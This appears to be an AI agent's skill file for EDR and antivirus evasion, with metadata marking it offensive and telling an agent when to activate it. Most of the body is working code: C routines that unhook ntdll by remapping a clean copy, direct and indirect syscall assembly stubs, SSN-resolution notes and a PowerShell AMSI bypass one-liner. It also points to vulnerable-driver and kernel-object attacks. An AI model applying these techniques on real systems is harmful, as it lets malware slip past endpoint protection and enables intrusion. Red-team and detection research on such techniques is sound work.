---
name: edr-evasion
description: "EDR/AV evasion payloads: hook unhooking, direct/indirect syscalls, PPID spoofing, process injection, AMSI bypass, ETW patching, memory/sleep encryption, behavioral evasion. Signals: EDR evasion, direct syscall, unhook."
zh-signals: "EDR/AV 规避运行载荷:hook unhook、直接/间接系统调用、PPID 欺骗、进程注入、AMSI 绕过、ETW 补丁、内存/睡眠加密、行为规避。信号:edr规避,直接系统调用,unhook。"
when-to-use: Use when bypassing EDR/AV to run a payload — hook unhooking, direct/indirect syscalls, PPID spoofing, process injection, AMSI bypass, ETW patching, memory/sleep encryption, behavioral evasion
metadata:
  type: offensive
  phase: evasion
  tools: syscall-stubs, ntdll-unhooking, amsi-patch, etw-patch, process-hollowing
kill_chain:
  phase: [delivery, install]
  step: [3, 5]
  attck_tactics: [TA0005]
depends_on: [exploit-development, shellcode-dev]
feeds_into: [red-team-ops, initial-access]
inputs: [edr_product, payload]
outputs: [evasive_payload, bypass_technique]
---

# EDR Evasion

## When to Activate

- Planning EDR bypass during red team engagements
- Researching AV/EDR evasion techniques
- Developing implants that must survive endpoint detection
- Testing detection capabilities of security products

## Fundamentals

### AV vs EDR

**Antivirus (preventive)**:
- Static analysis: matching known signatures in files
- Dynamic analysis: limited behavioral monitoring/sandboxing
- Effective against known threats, weaker against advanced attacks

**EDR (proactive & investigative)**:
- Continuous endpoint monitoring
- Behavioral analysis at kernel level
- Anomaly detection and post-compromise visibility
- Prioritizes incident response and investigation

### Windows Execution Flow

```
Application → DLL (kernel32/ntdll) → Syscall → Kernel (ntoskrnl)
                    ↑
              EDR hooks here
              (userland hooks in ntdll)
```

## Hook Unhooking

### Userland Unhooking (ntdll.dll)

EDRs hook ntdll functions by replacing the first bytes with a JMP to their inspection code.

```c
// Method 1: Map fresh ntdll from disk
HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
LPVOID freshNtdll = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);

// Get .text section of loaded ntdll
HMODULE loadedNtdll = GetModuleHandleA("ntdll.dll");
PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)loadedNtdll;
PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)loadedNtdll + dosHeader->e_lfanew);
PIMAGE_SECTION_HEADER textSection = IMAGE_FIRST_SECTION(ntHeaders);

// Overwrite hooked .text with clean copy
DWORD oldProtect;
VirtualProtect((LPVOID)((BYTE*)loadedNtdll + textSection->VirtualAddress),
    textSection->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
memcpy((LPVOID)((BYTE*)loadedNtdll + textSection->VirtualAddress),
    (LPVOID)((BYTE*)freshNtdll + textSection->VirtualAddress),
    textSection->Misc.VirtualSize);
VirtualProtect((LPVOID)((BYTE*)loadedNtdll + textSection->VirtualAddress),
    textSection->Misc.VirtualSize, oldProtect, &oldProtect);
```

```c
// Method 2: Map from KnownDlls (avoids disk read)
HANDLE hSection;
UNICODE_STRING name;
RtlInitUnicodeString(&name, L"\\KnownDlls\\ntdll.dll");
OBJECT_ATTRIBUTES oa = { sizeof(oa), NULL, &name, 0, NULL, NULL };
NtOpenSection(&hSection, SECTION_MAP_READ, &oa);
PVOID freshNtdll = NULL;
SIZE_T viewSize = 0;
NtMapViewOfSection(hSection, GetCurrentProcess(), &freshNtdll, 0, 0, NULL, &viewSize, ViewUnmap, 0, PAGE_READONLY);
```

### Kernel-Level Unhooking Detection

Some EDRs use kernel callbacks (PsSetCreateProcessNotifyRoutine, ObRegisterCallbacks) — these cannot be bypassed from userland alone. Requires:
- BYOVD (Bring Your Own Vulnerable Driver) to unload/disable kernel callbacks
- Direct kernel object manipulation (DKOM)

## Direct & Indirect Syscalls

### Direct Syscalls

Skip ntdll entirely — call the syscall instruction directly:

```nasm
; NtAllocateVirtualMemory syscall (Windows 10 21H2)
mov r10, rcx
mov eax, 0x18          ; syscall number (varies by Windows version!)
syscall
ret
```

**Tools**: SysWhispers3, HellsGate, HalosGate, TartarusGate

### Indirect Syscalls

JMP to the `syscall; ret` instruction inside ntdll (avoids "syscall from non-ntdll" detection):

```nasm
; Find syscall;ret gadget in ntdll
mov r10, rcx
mov eax, SSN           ; System Service Number
jmp [ntdll_syscall_ret_addr]  ; JMP to syscall;ret in ntdll
```

**Why indirect**: Some EDRs check the return address of syscalls — if it's not within ntdll's address range, it's flagged.

### SSN Resolution

```c
// HellsGate: read SSN from ntdll function prologue
// Clean function: mov r10, rcx; mov eax, SSN; ...
// Hooked function: jmp <hook_addr> (first bytes replaced)
// HalosGate: if hooked, look at neighbor functions (SSN ± 1)
// TartarusGate: walk further neighbors if immediate ones also hooked
```

## AMSI Bypass

```powershell
# Patch AmsiScanBuffer to return AMSI_RESULT_CLEAN
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

> 📎 详细内容（完整示例 / 参考 / 数据表）已拆分至同目录 `reference.md`，按需用 Read 读取对应小节。
